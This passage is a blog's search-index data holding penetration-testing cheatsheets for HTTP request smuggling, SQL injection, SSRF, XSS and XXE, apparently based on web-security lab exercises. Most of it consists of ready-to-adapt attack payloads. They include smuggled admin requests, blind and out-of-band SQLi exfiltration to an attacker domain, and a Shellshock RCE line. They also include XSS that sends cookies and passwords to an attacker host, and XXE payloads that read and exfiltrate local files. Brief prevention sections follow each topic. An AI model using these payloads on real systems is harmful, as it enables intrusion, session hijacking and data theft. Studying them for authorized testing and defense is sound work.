","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:2:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Bypass front-end protections Bypass front-end security controls, CL.TE vulnerability Here is an example of how you can bypass the front to make the back do what you want (that’s an example and you really have to adapt it): POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/add?username=test\u0026password=test HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= Bypass front-end security controls, TE.CL vulnerability Same thing as before, just the necessary change: POST / HTTP/1.1 Host: WEBSITE Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/add?username=test\u0026password=test HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:3:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Advanced Exploiting HTTP request smuggling to capture other users’ requests You need to be able to have a field that is at the end of your post data and to be able to update a site field or comment or post or … In that way you will catch the other user requests by redirect it back to your data in your post request. Here is an example: GET / HTTP/1.1 Host: WEBSITE Transfer-Encoding: chunked Content-Length: 324 0 POST /post/comment HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=YOURCOOKIE csrf=CSRFTOKEN\u0026postId=2\u0026name=YOURNAME\u0026email=EMAIL\u0026comment= ","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:4:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"How to prevent them How can implement a rejection of wierd / malformed request or also do these following actions : Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection. Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests. Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests. ","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:5:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"SQL injection cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SQL injection A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details. ","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/:0:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SQLi Basics Here will be some basics informations to get when you have a successfull injection SQL injection attack, querying the database type and version on Oracle Depending on the DB you can get the version as follow: Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() SQL injection attack, listing the database contents Non-Oracle DB select * from information\\_schema.tables Oracle DB select * from all_tables ","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/:1:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"Union SQL attack These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries You can have those following examples : Determining the number of columns returned by the query : Using Union : ' union select NULL-- Increasing number of NULL value until values are actually return Using Order : ' order by 1-- Increasing the int value until an error occured Finding a column containing text union select 'a', NULL, NULL, ...-- Add as many null as you need to match the number of columns Retrieving data from other tables union select CHAMP1, CHAMP2, .... from TABLE_NAME-- Again add as many null value as needed Retrieving multiple values in a single column union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME-- Very usefull when you only have the capacity to extract data from a uniq column ","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/:2:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"Blind SQL attack Conditional responses The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : ' and (select substring(password,1,1) from users where username='administrator')='a Conditional errors The goal here is to check errors based on a True query and on a false one. Here is an example: True statement : ' and (select case when (1=2) then 1/0 else 'a' end)='a False statement : ' and (select case when (1=1) then 1/0 else 'a' end)='a Time delays This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you’ve got SQLi. Examples : Using sleep: ';sleep(10)-- Using waitfor : '; if (1=1) waitfor delay '0:0:5'-- Time delays and information retrieval Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : '; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) \u003e 'm') = 1 waitfor delay '0:0:5'-- Out-of-band (OAST) This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that’s simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those : For Microsoft SQL Server Basic test: '; exec master..xp\\_dirtree '//MYDOMAIN/a'-- Data on subdomain: declare @q varchar(1024); set @q = 'master..xp\\_dirtree '\\\\\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\\_name()), 1),1,60) + '.MYDOMAIN\\\\foo'; exec(@q) MYSQL Check for the LOAD_FILE, sys_eval, http_get, .. functions ORACLE select dbms_ldap.init((select version from v$instance)||'.'||(select user from dual)||'.'||(select name from v$database)||'.'|'MYDOMAIN',80) from dual; SQL injection vulnerability allowing login bypass Very simple : username'-- ","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/:3:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"How to prevent them If a SQL injection attack is successfully carried out, the damage could be expensive in terms of resources and customer trust. That is why detecting this type of attack in a timely manner is important. Web application firewalls (WAF) are the most common tool used to filter out SQLi attacks. WAFs are based on a library of updated attack signatures and can be configured to flag malicious SQL queries. In order to prevent a SQL injection attack from occurring in the first place, developers can follow these practices: Avoid SQL statements that allow user input, choose prepared statements and parameterized queries instead. Perform input validation, or sanitization, for user-provided arguments. Do not leave sensitive data in plaintext format, or use encryption. Limit database permissions, privileges and capabilities to the bare minimum. Keep databases updated on security patches. Routinely test the security measures of applications that rely on databases. Remove the display of database error messages to the users. ","date":"2022-06-20","objectID":"/posts/penetration_testing/sqli/:4:0","tags":["web","penetest","sqli"],"title":"SQLi attack","uri":"/posts/penetration_testing/sqli/"},{"categories":["Penetest - Web"],"content":"SSRF cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Server-side request forgery In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed. ","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/:0:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Basics Local server This attack can be perform thanks to the loopback interface. Basicly you will have to find a parameter that fetch or possibly fetch an URL and loopback on the server himself to request the api or whatever. For example with the website fanOfNothing.com, on the page store, the search engine included will pass your search to the api using the following post request : searchFor=fanOfNothing.com:8008/api/search. So your way to access what you want to is to change the fanOfNothing.com:8008/api/search to for example fanOfNothing.com/admin. In that way the result will be the admin page and not the initial response Against another back-end system Basicly the same, just scan for internal APIs and then fuzz endpoint and get result on the search thing ","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/:1:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Bypassing filters SSRF with blacklist-based input filter Basicly for this you will need imagination and a good understanding of what you have in front of you. For example if 127.0.0.1 is block you can replace it by 127.1 you can double url encode strings, etc … SSRF with whitelist-based input filter This one is very well explained by portswigger so here is the essentials. To bypass whitelisting you can use thse following techniques : You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host. You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host. You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host. You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can use combinations of these techniques together. SSRF with filter bypass via open redirection vulnerability Same as the previous ones. Here is a payload example : param=http://weliketoshop.net/product/nextProduct?currentProductId=6\u0026path=http://INTERNAL_IP/WHATEVER ","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/:2:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Blind exploitation Blind SSRF with out-of-band detection Easiest blind attack to perform. If you just want to see if SSRF is a thing on the site, bounce back on your domain / IP and tcpdump to check incoming traffic. Blind SSRF with Shellshock exploitation This will principally lead to RCE, you can set the following payload (() { :; }; /usr/bin/nslookup $(COMMAND).YOUR_DOMAIN) on the Web agent field and exploit the SSRF as indicate in previous setps ","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/:3:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"How to prevent them You have several way to implement a protection for this type of attack. Here are some of them : Input validation (regex, whitelist, …) If you are using .NET, it can be expose to hex, dword, octal and mixed encoding Ensure that the domain is a trusted and valid one Configure a firewall to explicitly set legitimate flows …. ","date":"2022-06-20","objectID":"/posts/penetration_testing/ssrf/:4:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"XSS cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Cross-site scripting Cross-site scripting is used to inject malicious javascript code to user browser. This attack can lead to a total control of the application in use. More details and specific stuff can be found here ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:0:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Basics Exploiting cross-site scripting to steal cookies This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. There is comon security system used to avoid this attack: The victim might not be logged in. Many applications hide their cookies from JavaScript using the HttpOnly flag. Sessions might be locked to additional factors like the user’s IP address. The session might time out before you’re able to hijack it. Here is an example of that type of XSS: \u003cscript\u003e fetch('https://MYDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); \u003c/script\u003e Exploiting cross-site scripting to capture passwords This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : \u003cinput name=username id=username\u003e \u003cinput type=password name=password onchange=\" if(this.value.length)fetch('https://MYDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });\"\u003e Exploiting XSS to perform CSRF XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: \u003cscript\u003e var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name=\"csrf\" value=\"(\\\\w+)\"/)\\[1\\]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'\u0026email=test@test.com') }; \u003c/script\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:1:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Reflected XSS Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : HTML context with nothing encoded \u003cscript\u003ealert(1)\u003c/script\u003e HTML context with most tags and attributes blocked \u003ciframe src=\"https://WEBSITE/?search=\"\u003e\u003cbody onresize=alert(document.cookie)\u003e\" onload=this.style.width='100px'\u003e HTML context with all tags blocked except custom ones \u003cscript\u003e location = 'https://WEBSITE/?search=\u003cxss+id=x+onfocus=alert(document.cookie) tabindex=1\u003e#x'; \u003c/script\u003e Event handlers and href attributes blocked https://WEBSITE/?search=\u003csvg\u003e\u003ca\u003e\u003canimate+attributeName=href+values=javascript:alert(1)+/\u003e\u003ctext+x=20+y=20\u003eClick me\u003c/text\u003e\u003c/a\u003e Some SVG markup allowed https://WEBSITE/?search=\"\u003e\u003csvg\u003e\u003canimatetransform onbegin=alert(1)\u003e Reflected XSS with AngularJS sandbox escape without strings https://your-lab-id.web-security-academy.net/?search=1\u0026toString().constructor.prototype.charAt%3d\\[\\].join;\\[1\\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 Reflected XSS with AngularJS sandbox escape and CSP \u003cscript\u003e location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; \u003c/script\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:2:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Stored XSS Stored XSS is an injection in the actual page by any way (message, template injection, input, …). Here are some examples: Stored XSS into anchor href attribute with double quotes HTML-encoded javascript:alert('XSS') Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped \u0026apos;-alert(1)-\u0026apos; ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:3:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"DOM XSS DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment. As the vulnaribility is app specific, there will be no example and you will have to use your brain. ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:4:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Escape CSP CSP or ‘Content Security Policy ’ is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a checker to dig in what you have in front of you. As the topic is large again here is a link to understand what the checker gave you ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:5:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"How to prevent them Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input. Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding. Use appropriate response headers. To prevent XSS in HTTP responses that aren’t intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend. Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur. ","date":"2022-06-20","objectID":"/posts/penetration_testing/xss/:6:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"XXE cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"XML external entity injection XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one. This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications. ","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/:0:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Basics External entities to retrieve files Simple payload to retrieve a file from the filesystem \u003c!DOCTYPE test \\[ \u003c!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM \"file:///etc/passwd\"\u003e \\]\u003e Perform SSRF attacks As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever \u003c!DOCTYPE test \\[ \u003c!ENTITY xxe SYSTEM \"http://127.0.0.1/\"\u003e \\]\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/:1:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Blind XXE Out-of-band interaction In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic. \u003c!DOCTYPE test \\[ \u003c!ENTITY xxe SYSTEM \"YOUR_DOMAIN_OR_IP\"\u003e \\]\u003e Out-of-band interaction via XML parameter entities Same principle and a similar payload but two different test \u003c!DOCTYPE stockCheck \\[\u003c!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM \"YOUR_DOMAIN_OR_IP\"\u003e %xxe; \\]\u003e Exfiltrate data using a malicious external DTD First, DTD is a text file that store XML attributes and elements used by an application. This exfiltration has two phases: You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload: \u003c!ENTITY % file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'YOURDOMAIN/?log=%file;'\u003e\"\u003e %eval; %exfil; Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow : \u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"DTD_URL\"\u003e %xxe;]\u003e Now you should tcpdump or go to your website logs to view the file you want to retrieve. Retrieve data via error messages This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one: \u003c!ENTITY % file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'file:///invalid/%file;'\u003e\"\u003e %eval; %exfil; This will throw an error containing the file you specify Retrieve data by repurposing a local DTD For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is DTD_LOCAL_FILE and the entity inside is called PWNME. The following payload is to include on the XML post data : \u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file://DTD_LOCAL_FILE\"\u003e \u003c!ENTITY % PWNME ' \u003c!ENTITY \u0026#x25; file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///nonexistent/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; '\u003e %local_dtd; ]\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/:2:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Others examples Exploiting XInclude to retrieve files Back to basics, simple efficient payload : \u003cfoo xmlns:xi=\"http://www.w3.org/2001/XInclude\"\u003e\u003cxi:include parse=\"text\" href=\"file://FILE_PATH_TO_RETRIEVE\"/\u003e\u003c/foo\u003e Exploiting XXE via image file upload For this attack you will have to prepare a SVG file containing the following payload and adapt parameters : \u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file://FILE_PATH_TO_RETRIEVE\" \u003e ]\u003e\u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e\u003c/svg\u003e Then just upload it as an image and you should have the file data in your image display ","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/:3:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"How to prevent them XXE exist due to bad handle of user input or used of dangerous function in used librairie. The best way to prevent them is to include only necessaries functions or remove unnecessaries ones. Import ones to disable are XInclude and external entities resolutions ","date":"2022-06-20","objectID":"/posts/penetration_testing/xxe/:4:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"}]